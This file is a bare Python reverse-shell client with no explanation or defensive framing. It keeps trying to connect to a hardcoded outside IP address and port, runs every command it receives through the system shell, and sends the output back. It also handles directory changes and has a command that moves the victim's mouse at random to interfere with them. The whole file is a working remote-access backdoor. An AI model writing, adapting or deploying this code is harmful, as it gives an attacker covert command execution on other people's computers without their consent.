import os
import socket
import subprocess
import time
import pyautogui as pg
import random as rn

def connect_to_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('91.245.44.46', 1212))
            return s 
        except Exception as e:
            print(f"Connection failed: {e}")
            time.sleep(5)

def handle_server_communication(s):
    try:
        while True:
            data = s.recv(1024).decode('utf-8')
            if not data:
                break

            if data.startswith('cd '):
                try:
                    os.chdir(data[3:])
                    response = "Directory changed"
                    
                except FileNotFoundError:
                   response = "Invalid directory"
                    
            elif data.startswith('mouse_off') or data.startswith('mo'):
                w, h = pg.size()
                duration = int(data.split()[1])
                starting_time = time.time()
                while time.time() - starting_time < duration:
                    x_mouse = rn.randint(0, w)
                    y_mouse = rn.randint(0, h)
                    pg.moveTo(x_mouse, y_mouse)
                    time.sleep(0.1)
                    
                
            
            else:
                command = subprocess.run(data,shell=True,capture_output=True,text=True)
                response = command.stdout if command.stdout else command.stderr 
                s.sendall(response.encode('utf-8'))
    except Exception as e:
        print(f"Error during communication: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    server_socket = connect_to_server()
    handle_server_communication(server_socket)
